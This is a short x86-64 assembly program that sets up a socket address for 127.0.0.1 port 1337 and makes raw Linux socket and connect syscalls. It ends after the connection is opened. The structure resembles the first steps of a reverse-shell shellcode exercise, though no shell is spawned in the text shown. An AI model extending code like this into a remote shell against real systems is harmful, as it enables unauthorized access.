segment .bss
	struc sockaddr	; struct for socket

		sin_family: resw 1	; type IPv4
		sin_port: resw 1	; port
		sin_addr: resd 1	; address

	endstruc
	
segment .data
	sockaddr_struct_init:

		istruc sockaddr
			at sin_family, dw 0x2
			at sin_port, dw 0x3905
			at sin_addr, dd 0x100007f
		iend

segment .text
	global _start:

_start:
	mov rax, 41	; syscall for socket
	mov rdi, 2	; IPv4
	mov rsi, 1	; TCP connexion
	mov rdx, 6	; TCP protocol
	syscall

	push rax	; save the fd
	jmp _connection

_connection:
	mov rax, 42	; syscall for connexion
	pop rdi		; recover the fd
	mov rsi, sockaddr_struct_init
	mov rdx, 0x10	; address lengh
	syscall
